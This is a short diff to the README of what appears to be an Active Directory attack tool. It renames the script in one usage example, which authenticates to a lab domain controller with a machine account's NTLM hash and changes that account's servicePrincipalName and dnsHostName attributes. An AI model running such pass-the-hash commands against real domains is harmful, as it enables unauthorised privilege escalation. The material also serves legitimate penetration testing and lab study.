@@ -22,7 +22,7 @@ _Note: If you received an error of Name Service not found, you might wanna add t
 ### In case where you obtain a machine account hash
 _CAVEAT: that this will modify the `servicePrincipalName` and `dnsHostName` attribute of the current computer account_
 ```
-python3 modify_ourself.py range.net/ws01\$@192.168.86.182 -hashes :0e3ae07798e1bc9e02b049a795a7e69f
+python3 modify_computer.py range.net/ws01\$@192.168.86.182 -hashes :0e3ae07798e1bc9e02b049a795a7e69f
 ```
 
 ## Credits 
